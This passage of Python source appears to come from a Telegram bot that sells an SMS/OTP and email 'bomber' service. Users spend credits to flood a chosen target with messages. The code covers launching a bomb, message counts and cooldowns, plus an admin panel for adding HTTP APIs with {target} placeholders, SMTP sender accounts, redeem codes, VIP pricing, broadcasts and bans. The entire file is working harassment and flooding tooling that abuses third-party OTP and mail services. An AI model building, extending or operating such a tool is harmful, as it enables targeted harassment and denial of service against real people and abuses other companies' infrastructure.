async def cb_bomb_count(c: types.CallbackQuery, state: FSMContext):
    part = c.data.split(":")[2]
    if part == "custom":
        return
    try:
        count = int(part)
    except ValueError:
        return await c.answer("bad")
    data = await state.get_data()
    target = data.get("target")
    if not target:
        await state.clear()
        return await c.answer("expired, start over", show_alert=True)
    await state.clear()
    await _start_bomb(c.message, c.from_user.id, target, count, edit=True)
    await c.answer()


async def _start_bomb(msg, uid, target, count, edit=False):
    u = get_user(uid)
    if u["banned"]:
        return
    max_c = setting("max_count", int)
    if count < 1 or count > max_c:
        return await msg.answer(f"❌ count must be 1..{max_c}")
    now = int(time.time())
    cooldown = setting("cooldown", int)
    if u["vip_cost"] <= 0 and now - u["last_bomb"] < cooldown:
        return await msg.answer(f"⏳ wait {cooldown - (now - u['last_bomb'])}s")
    if is_blacklisted(target):
        return await msg.answer("🚫 target blacklisted")
    cost = u["vip_cost"] if u["vip_cost"] > 0 else setting("bomb_cost", int)
    if not take_credits(uid, cost):
        return await msg.answer(f"❌ need {cost} credits")
    _exec("UPDATE users SET last_bomb=?, total_bombs=total_bombs+1 WHERE user_id=?",
          (now, uid))
    log_action(uid, "bomb", f"{target} x{count}")
    text = f"🚀 Launching on <code>{target}</code> — {count} msgs..."
    status = await (msg.edit_text(text) if edit else msg.answer(text))
    asyncio.create_task(_run_and_report(status, uid, target, count, "OTP"))


async def _run_and_report(status_msg, uid, target, count, msg):
    try:
        ok, fail, err = await bomb_worker(target, count, msg)
        text = (f"⚠️ Cannot fire: {err}" if err else
                f"✅ <b>Done</b>\n\n"
                f"🎯 Target: <code>{target}</code>\n"
                f"📨 Sent: <b>{ok}</b>  ❌ Failed: <b>{fail}</b>\n"
                f"💳 Balance: <b>{get_user(uid)['credits']}</b>")
        _exec("INSERT INTO bomb_history(user_id,target,count,msg,ok,fail,ts) "
              "VALUES(?,?,?,?,?,?,?)",
              (uid, target, count, msg, ok, fail, int(time.time())))
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💣 Bomb Again", callback_data="m:bomb"),
             InlineKeyboardButton(text="🏠 Main Menu",  callback_data="m:home")]])
        try: await status_msg.edit_text(text, reply_markup=kb)
        except Exception: pass
    except Exception as e:
        log.exception("bomb crashed")
        try: await status_msg.edit_text(f"⚠️ crashed: <code>{e}</code>", reply_markup=back_kb())
        except Exception: pass


# ─────────────────────────── REDEEM ───────────────────────────
@dp.callback_query(F.data == "m:redeem")
async def cb_redeem_start(c: types.CallbackQuery, state: FSMContext):
    await state.set_state(UserFSM.redeem_code)
    await c.message.edit_text("🎁 <b>Redeem Code</b>\n\nSend your code.",
                              reply_markup=cancel_kb())
    await c.answer()


@dp.message(UserFSM.redeem_code)
async def fsm_redeem_code(m: types.Message, state: FSMContext):
    code = m.text.strip().upper()
    await state.clear()
    row = _exec("SELECT * FROM redeem_codes WHERE code=? AND active=1",
                (code,), fetch="one")
    if not row:
        return await m.answer("❌ Invalid code.", reply_markup=main_menu_kb(is_admin(m.from_user.id)))
    if row["used"] >= row["max_uses"]:
        return await m.answer("❌ Exhausted.", reply_markup=main_menu_kb(is_admin(m.from_user.id)))
    if _exec("SELECT 1 FROM redeem_uses WHERE code=? AND user_id=?",
             (code, m.from_user.id), fetch="one"):
        return await m.answer("❌ Already used.", reply_markup=main_menu_kb(is_admin(m.from_user.id)))
    add_credits(m.from_user.id, row["amount"])
    _exec("UPDATE redeem_codes SET used=used+1 WHERE code=?", (code,))
    _exec("INSERT INTO redeem_uses(code,user_id,used_at) VALUES(?,?,?)",
          (code, m.from_user.id, int(time.time())))
    log_action(m.from_user.id, "redeem", f"{code} +{row['amount']}")
    await m.answer(
        f"✅ Redeemed! +{row['amount']} credits\n"
        f"💳 Balance: <b>{get_user(m.from_user.id)['credits']}</b>",
        reply_markup=main_menu_kb(is_admin(m.from_user.id)))


# ─────────────────────────── ADMIN PANEL ───────────────────────────
def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Stats",        callback_data="a:stats"),
         InlineKeyboardButton(text="👥 Users",        callback_data="a:users:0")],
        [InlineKeyboardButton(text="➕ Add Credits",  callback_data="a:add"),
         InlineKeyboardButton(text="➖ Deduct",       callback_data="a:ded")],
        [InlineKeyboardButton(text="🎁 Redeem",       callback_data="a:redeem"),
         InlineKeyboardButton(text="🔌 APIs",         callback_data="a:apis")],
        [InlineKeyboardButton(text="📧 SMTP",         callback_data="a:smtp"),
         InlineKeyboardButton(text="⚙️ Settings",     callback_data="a:settings")],
        [InlineKeyboardButton(text="📢 Broadcast",    callback_data="a:bcast"),
         InlineKeyboardButton(text="🔎 Find User",    callback_data="a:find")],
        [InlineKeyboardButton(text="🚫 Blacklist",    callback_data="a:black"),
         InlineKeyboardButton(text="⭐ VIP",          callback_data="a:vip")],
        [InlineKeyboardButton(text="👑 Admins",       callback_data="a:admins"),
         InlineKeyboardButton(text="📋 Logs",         callback_data="a:logs:0")],
        [InlineKeyboardButton(text="📤 Export",       callback_data="a:export"),
         InlineKeyboardButton(text="🏠 Main Menu",    callback_data="m:home")],
    ])


def admin_back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]])


@dp.callback_query(F.data == "a:home")
async def cb_admin_home(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.clear()
    await c.message.edit_text("🛠 <b>Admin Panel</b>", reply_markup=admin_kb())
    await c.answer()


@dp.callback_query(F.data == "a:stats")
async def cb_stats(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    total = _exec("SELECT COUNT(*) c FROM users", fetch="one")["c"]
    banned = _exec("SELECT COUNT(*) c FROM users WHERE banned=1", fetch="one")["c"]
    credits = _exec("SELECT COALESCE(SUM(credits),0) s FROM users", fetch="one")["s"]
    bombs = _exec("SELECT COALESCE(SUM(total_bombs),0) s FROM users", fetch="one")["s"]
    codes = _exec("SELECT COUNT(*) c FROM redeem_codes WHERE active=1", fetch="one")["c"]
    apis = _exec("SELECT COUNT(*) c FROM apis WHERE active=1", fetch="one")["c"]
    apis_all = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
    smtps = _exec("SELECT COUNT(*) c FROM smtp_accounts WHERE active=1", fetch="one")["c"]
    admins = _exec("SELECT COUNT(*) c FROM admins", fetch="one")["c"]
    await c.message.edit_text(
        f"📊 <b>Stats</b>\n\n"
        f"👥 Users: <b>{total}</b> (banned {banned})\n"
        f"👑 Admins: <b>{admins}</b>\n"
        f"💳 Credits: <b>{credits}</b>\n"
        f"💥 Total bombs: <b>{bombs}</b>\n"
        f"🎁 Active codes: <b>{codes}</b>\n"
        f"🔌 HTTP APIs: <b>{apis}/{apis_all}</b>\n"
        f"📧 SMTP: <b>{smtps}</b>",
        reply_markup=admin_back_kb())
    await c.answer()


@dp.callback_query(F.data.startswith("a:users:"))
async def cb_users(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    page = int(c.data.split(":")[2])
    per = 10
    total = _exec("SELECT COUNT(*) c FROM users", fetch="one")["c"]
    max_page = max(0, (total - 1) // per)
    page = min(page, max_page)
    rows = _exec("SELECT * FROM users ORDER BY created_at DESC LIMIT ? OFFSET ?",
                 (per, page * per), fetch="all")
    lines = []
    for r in rows:
        flag = "🚫" if r["banned"] else "✅"
        lines.append(f"{flag} <code>{r['user_id']}</code> "
                     f"@{r['username'] or '-'} | 💳{r['credits']} | 💥{r['total_bombs']}")
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="⬅️", callback_data=f"a:users:{page-1}"))
    if page < max_page:
        nav.append(InlineKeyboardButton(text="➡️", callback_data=f"a:users:{page+1}"))
    kb = ([nav] if nav else []) + [[InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]
    await c.message.edit_text(
        f"👥 <b>Users</b> ({page+1}/{max_page+1})\n\n" + ("\n".join(lines) or "none"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    await c.answer()


# ─── Admins management ───
@dp.callback_query(F.data == "a:admins")
async def cb_admins(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM admins ORDER BY added_at", fetch="all")
    lines = [f"👑 <code>{r['user_id']}</code>" for r in rows]
    await c.message.edit_text(
        "👑 <b>Admins</b>\n\n" + ("\n".join(lines) or "none"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Add Admin", callback_data="a:admin_add")],
            [InlineKeyboardButton(text="🗑 Remove Admin", callback_data="a:admin_remove")],
            [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:admin_add")
async def cb_admin_add(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.add_admin_id)
    await c.message.edit_text("👑 Send user_id to promote.",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.add_admin_id)
async def fsm_admin_add(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    if not m.text.strip().isdigit():
        return await m.answer("numeric")
    uid = int(m.text.strip())
    if not get_user(uid):
        return await m.answer("user not found — they must /start the bot first")
    _exec("INSERT OR IGNORE INTO admins(user_id,added_by,added_at) VALUES(?,?,?)",
          (uid, m.from_user.id, int(time.time())))
    log_action(m.from_user.id, "admin_add_admin", str(uid))
    await state.clear()
    await m.answer(f"✅ <code>{uid}</code> is now admin.",
                   reply_markup=admin_kb())
    try: await bot.send_message(uid, "👑 You are now an admin.")
    except Exception: pass


@dp.callback_query(F.data == "a:admin_remove")
async def cb_admin_remove(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.remove_admin_id)
    await c.message.edit_text("👑 Send user_id to demote.",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.remove_admin_id)
async def fsm_admin_remove(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    if not m.text.strip().isdigit():
        return await m.answer("numeric")
    uid = int(m.text.strip())
    if uid == m.from_user.id:
        return await m.answer("can't remove yourself")
    _exec("DELETE FROM admins WHERE user_id=?", (uid,))
    log_action(m.from_user.id, "admin_remove_admin", str(uid))
    await state.clear()
    await m.answer(f"✅ <code>{uid}</code> removed from admins.",
                   reply_markup=admin_kb())


# ─── Credits management ───
@dp.callback_query(F.data == "a:add")
async def cb_add(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.add_credits_uid)
    await c.message.edit_text("➕ Send user_id", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.add_credits_uid)
async def fsm_add_uid(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    if not m.text.strip().isdigit(): return await m.answer("numeric")
    await state.update_data(uid=int(m.text.strip()))
    await state.set_state(AdminFSM.add_credits_amt)
    await m.answer("Send amount")


@dp.message(AdminFSM.add_credits_amt)
async def fsm_add_amt(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    try: amt = int(m.text.strip())
    except ValueError: return await m.answer("numeric")
    d = await state.get_data()
    uid = d.get("uid")
    if not uid or not get_user(uid):
        await state.clear(); return await m.answer("user not found")
    add_credits(uid, amt)
    log_action(m.from_user.id, "admin_add_credits", f"to={uid} amt={amt}")
    await state.clear()
    await m.answer(f"✅ +{amt} to <code>{uid}</code>. "
                   f"Balance: {get_user(uid)['credits']}", reply_markup=admin_kb())
    try: await bot.send_message(uid, f"💳 +{amt} credits from admin.")
    except Exception: pass


@dp.callback_query(F.data == "a:ded")
async def cb_ded(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.ded_credits_uid)
    await c.message.edit_text("➖ Send user_id", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.ded_credits_uid)
async def fsm_ded_uid(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    if not m.text.strip().isdigit(): return await m.answer("numeric")
    await state.update_data(uid=int(m.text.strip()))
    await state.set_state(AdminFSM.ded_credits_amt)
    await m.answer("Send amount")


@dp.message(AdminFSM.ded_credits_amt)
async def fsm_ded_amt(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    try: amt = int(m.text.strip())
    except ValueError: return await m.answer("numeric")
    d = await state.get_data()
    uid = d.get("uid")
    u = get_user(uid) if uid else None
    if not u:
        await state.clear(); return await m.answer("user not found")
    new = max(0, u["credits"] - amt)
    _exec("UPDATE users SET credits=? WHERE user_id=?", (new, uid))
    log_action(m.from_user.id, "admin_ded_credits", f"to={uid} amt={amt}")
    await state.clear()
    await m.answer(f"✅ deducted. Balance: {new}", reply_markup=admin_kb())


# ─── Redeem codes ───
@dp.callback_query(F.data == "a:redeem")
async def cb_redeem(c: types.CallbackQuery):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM redeem_codes ORDER BY created_at DESC LIMIT 15", fetch="all")
    lines = [f"<code>{r['code']}</code> | {r['amount']}c | "
             f"{r['used']}/{r['max_uses']}" for r in rows]
    await c.message.edit_text(
        "🎁 <b>Redeem Codes</b>\n\n" + ("\n".join(lines) or "none"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Create", callback_data="a:redeem_new")],
            [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:redeem_new")
async def cb_redeem_new(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.redeem_amount)
    await c.message.edit_text("Send credit amount", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.redeem_amount)
async def fsm_redeem_amt(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    try: amt = int(m.text.strip())
    except ValueError: return await m.answer("numeric")
    await state.update_data(amount=amt)
    await state.set_state(AdminFSM.redeem_uses)
    await m.answer("Send max uses (0 = unlimited)")


@dp.message(AdminFSM.redeem_uses)
async def fsm_redeem_uses(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    try: uses = int(m.text.strip())
    except ValueError: return await m.answer("numeric")
    if uses <= 0: uses = 10**9
    d = await state.get_data()
    code = gen_code(10)
    _exec("INSERT INTO redeem_codes(code,amount,max_uses,created_by,created_at) "
          "VALUES(?,?,?,?,?)", (code, d["amount"], uses, m.from_user.id, int(time.time())))
    log_action(m.from_user.id, "admin_create_code", f"{code} amt={d['amount']}")
    await state.clear()
    await m.answer(f"✅ <code>{code}</code> ({d['amount']}c, {uses} uses)",
                   reply_markup=admin_kb())


# ─── APIs ───
@dp.callback_query(F.data == "a:apis")
async def cb_apis(c: types.CallbackQuery):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    total = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
    active = _exec("SELECT COUNT(*) c FROM apis WHERE active=1", fetch="one")["c"]
    rows = _exec("SELECT * FROM apis ORDER BY id LIMIT 20", fetch="all")
    lines = [f"#{r['id']} <b>{r['name']}</b> "
             f"{'✅' if r['active'] else '🚫'} ok:{r['ok_count']} "
             f"fail:{r['fail_count']}" for r in rows]
    await c.message.edit_text(
        f"🔌 <b>APIs</b> — {active}/{total} active\n\n" + ("\n".join(lines) or "none"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Add", callback_data="a:api_new")],
            [InlineKeyboardButton(text="🗑 Del", callback_data="a:api_del"),
             InlineKeyboardButton(text="🔁 Toggle", callback_data="a:api_tog")],
            [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:api_new")
async def cb_api_new(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.api_name)
    await c.message.edit_text("API name", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.api_name)
async def fsm_api_name(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    await state.update_data(name=m.text.strip())
    await state.set_state(AdminFSM.api_url)
    await m.answer("URL. Use {target} and {msg}.")


@dp.message(AdminFSM.api_url)
async def fsm_api_url(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    await state.update_data(url=m.text.strip())
    await state.set_state(AdminFSM.api_method)
    await m.answer("GET / POST / PUT")


@dp.message(AdminFSM.api_method)
async def fsm_api_method(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    meth = m.text.strip().upper()
    if meth not in ("GET","POST","PUT"):
        return await m.answer("GET / POST / PUT")
    await state.update_data(method=meth)
    await state.set_state(AdminFSM.api_body)
    await m.answer("Body (or '-')")


@dp.message(AdminFSM.api_body)
async def fsm_api_body(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    await state.update_data(body="" if m.text.strip() == "-" else m.text.strip())
    await state.set_state(AdminFSM.api_headers)
    await m.answer("Headers one per line 'Key: Value' (or '-')")


@dp.message(AdminFSM.api_headers)
async def fsm_api_headers(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    headers = "" if m.text.strip() == "-" else m.text.strip()
    d = await state.get_data()
    _exec("INSERT INTO apis(name,channel,url,method,body,headers,created_at) "
          "VALUES(?,?,?,?,?,?,?)",
          (d["name"], "http", d["url"], d["method"], d["body"], headers, int(time.time())))
    log_action(m.from_user.id, "admin_add_api", d["name"])
    await state.clear()
    await m.answer("✅ API added", reply_markup=admin_kb())


@dp.callback_query(F.data == "a:api_del")
async def cb_api_del(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="api_del")
    await c.message.edit_text("API ID to delete", reply_markup=admin_back_kb())
    await c.answer()


@dp.callback_query(F.data == "a:api_tog")
async def cb_api_tog(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="api_tog")
    await c.message.edit_text("API ID to toggle", reply_markup=admin_back_kb())
    await c.answer()


# ─── SMTP ───
@dp.callback_query(F.data == "a:smtp")
async def cb_smtp(c: types.CallbackQuery):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM smtp_accounts ORDER BY id", fetch="all")
    lines = [f"#{r['id']} <code>{r['username']}</code> @ "
             f"{r['host']}:{r['port']} "
             f"{'✅' if r['active'] else '🚫'} "
             f"ok:{r['ok_count']} fail:{r['fail_count']}" for r in rows]
    await c.message.edit_text(
        "📧 <b>SMTP Accounts</b>\n\n" + ("\n".join(lines) or "none"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Add SMTP", callback_data="a:smtp_new")],
            [InlineKeyboardButton(text="🗑 Del", callback_data="a:smtp_del")],
            [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:smtp_new")
async def cb_smtp_new(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.smtp_host)
    await c.message.edit_text("SMTP host (e.g. smtp.gmail.com)",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.smtp_host)
async def fsm_smtp_host(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    await state.update_data(host=m.text.strip())
    await state.set_state(AdminFSM.smtp_port)
    await m.answer("Port (587 or 465)")


@dp.message(AdminFSM.smtp_port)
async def fsm_smtp_port(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    try: port = int(m.text.strip())
    except ValueError: return await m.answer("numeric")
    await state.update_data(port=port)
    await state.set_state(AdminFSM.smtp_user)
    await m.answer("Username (full email)")


@dp.message(AdminFSM.smtp_user)
async def fsm_smtp_user(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    await state.update_data(username=m.text.strip())
    await state.set_state(AdminFSM.smtp_pass)
    await m.answer("Password / app password")


@dp.message(AdminFSM.smtp_pass)
async def fsm_smtp_pass(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    await state.update_data(password=m.text.strip())
    await state.set_state(AdminFSM.smtp_name)
    await m.answer("From name (e.g. Support)")


@dp.message(AdminFSM.smtp_name)
async def fsm_smtp_name(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    d = await state.get_data()
    _exec("INSERT INTO smtp_accounts(host,port,username,password,from_name) "
          "VALUES(?,?,?,?,?)",
          (d["host"], d["port"], d["username"], d["password"], m.text.strip()))
    log_action(m.from_user.id, "admin_add_smtp", d["username"])
    await state.clear()
    await m.answer("✅ SMTP added", reply_markup=admin_kb())


@dp.callback_query(F.data == "a:smtp_del")
async def cb_smtp_del(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="smtp_del")
    await c.message.edit_text("SMTP ID to delete", reply_markup=admin_back_kb())
    await c.answer()


# ─── Settings ───
@dp.callback_query(F.data == "a:settings")
async def cb_settings(c: types.CallbackQuery):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    keys = ["bomb_cost","max_count","cooldown","concurrency",
            "daily_bonus","referral_bonus","maintenance"]
    txt = "⚙️ <b>Settings</b>\n\n" + "\n".join(f"{k}: <b>{setting(k)}</b>" for k in keys)
    rows = []
    for i in range(0, len(keys), 2):
        row = [InlineKeyboardButton(text=keys[i], callback_data=f"a:set:{keys[i]}")]
        if i + 1 < len(keys):
            row.append(InlineKeyboardButton(text=keys[i+1], callback_data=f"a:set:{keys[i+1]}"))
        rows.append(row)
    rows.append([InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")])
    await c.message.edit_text(txt, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    await c.answer()


@dp.callback_query(F.data.startswith("a:set:"))
async def cb_set_edit(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    key = c.data.split(":", 2)[2]
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="setting", key=key)
    await c.message.edit_text(f"New value for <b>{key}</b>", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.edit_setting)
async def fsm_edit_setting(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    d = await state.get_data()
    mode = d.get("mode")

    if mode == "setting":
        key = d.get("key")
        val = m.text.strip()
        numeric_keys = {"bomb_cost","max_count","cooldown","concurrency",
                        "daily_bonus","referral_bonus","maintenance"}
        if key in numeric_keys:
            try: int(val)
            except ValueError: return await m.answer("numeric required")
        set_setting(key, val)
        await state.clear()
        return await m.answer(f"✅ {key} = {val}", reply_markup=admin_kb())

    if mode == "api_del":
        if not m.text.strip().isdigit(): return await m.answer("numeric id")
        _exec("DELETE FROM apis WHERE id=?", (int(m.text.strip()),))
        await state.clear(); return await m.answer("✅ deleted", reply_markup=admin_kb())

    if mode == "api_tog":
        if not m.text.strip().isdigit(): return await m.answer("numeric id")
        _exec("UPDATE apis SET active=1-active, fail_streak=0 WHERE id=?",
              (int(m.text.strip()),))
        await state.clear(); return await m.answer("✅ toggled", reply_markup=admin_kb())

    if mode == "smtp_del":
        if not m.text.strip().isdigit(): return await m.answer("numeric id")
        _exec("DELETE FROM smtp_accounts WHERE id=?", (int(m.text.strip()),))
        await state.clear(); return await m.answer("✅ deleted", reply_markup=admin_kb())

    if mode == "black_del":
        target = m.text.strip()
        _exec("DELETE FROM blacklist WHERE target=?", (target,))
        await state.clear()
        return await m.answer(f"✅ removed <code>{target}</code>", reply_markup=admin_kb())

    await state.clear()
    return await m.answer("⚠️ state lost.", reply_markup=admin_kb())


# ─── Find / Ban / Blacklist / VIP / Logs / Export ───
@dp.callback_query(F.data == "a:find")
async def cb_find(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.find_user)
    await c.message.edit_text("Send user_id", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.find_user)
async def fsm_find(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    if not m.text.strip().isdigit(): return await m.answer("numeric")
    uid = int(m.text.strip())
    u = get_user(uid)
    if not u: return await m.answer("not found")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚫 Ban" if not u["banned"] else "✅ Unban",
                              callback_data=f"a:ban:{uid}")],
        [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]])
    await m.answer(
        f"👤 <code>{uid}</code>\n"
        f"@{u['username'] or '-'} | {u['first_name']}\n"
        f"💳 {u['credits']} | 💥 {u['total_bombs']}\n"
        f"⭐ vip cost: {u['vip_cost']}\n"
        f"Status: {'🚫 banned' if u['banned'] else '✅ active'}",
        reply_markup=kb)
    await state.clear()


@dp.callback_query(F.data.startswith("a:ban:"))
async def cb_ban(c: types.CallbackQuery):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    uid = int(c.data.split(":")[2])
    _exec("UPDATE users SET banned=1-banned WHERE user_id=?", (uid,))
    log_action(c.from_user.id, "admin_toggle_ban", str(uid))
    await c.answer("toggled", show_alert=True)


@dp.callback_query(F.data == "a:bcast")
async def cb_bcast(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.broadcast)
    await c.message.edit_text("Send broadcast message", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.broadcast)
async def fsm_bcast(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    await state.clear()
    asyncio.create_task(_do_broadcast(m))


async def _do_broadcast(m: types.Message):
    users = _exec("SELECT user_id FROM users WHERE banned=0", fetch="all")
    sent = failed = 0
    status = await m.answer(f"📢 Broadcasting to {len(users)} users...")
    for row in users:
        try:
            await bot.send_message(row["user_id"], m.html_text)
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.05)
    try: await status.edit_text(f"✅ Done. Sent {sent}, failed {failed}")
    except Exception: pass


@dp.callback_query(F.data == "a:black")
async def cb_black(c: types.CallbackQuery):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM blacklist ORDER BY added_at DESC LIMIT 30", fetch="all")
    lines = [f"• <code>{r['target']}</code>" for r in rows]
    await c.message.edit_text(
        "🚫 <b>Blacklist</b>\n\n" + ("\n".join(lines) or "empty"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Add", callback_data="a:black_add")],
            [InlineKeyboardButton(text="🗑 Remove", callback_data="a:black_del")],
            [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:black_add")
async def cb_black_add(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.blacklist_add)
    await c.message.edit_text("Target to blacklist", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.blacklist_add)
async def fsm_black_add(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    t = m.text.strip()
    _exec("INSERT OR IGNORE INTO blacklist(target,added_by,added_at) VALUES(?,?,?)",
          (t, m.from_user.id, int(time.time())))
    await state.clear()
    await m.answer(f"✅ blacklisted <code>{t}</code>", reply_markup=admin_kb())


@dp.callback_query(F.data == "a:black_del")
async def cb_black_del(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="black_del")
    await c.message.edit_text("Target to remove", reply_markup=admin_back_kb())
    await c.answer()


@dp.callback_query(F.data == "a:vip")
async def cb_vip(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.vip_uid)
    await c.message.edit_text("⭐ Send user_id", reply_markup=admin_back_kb())
    await c.answer()


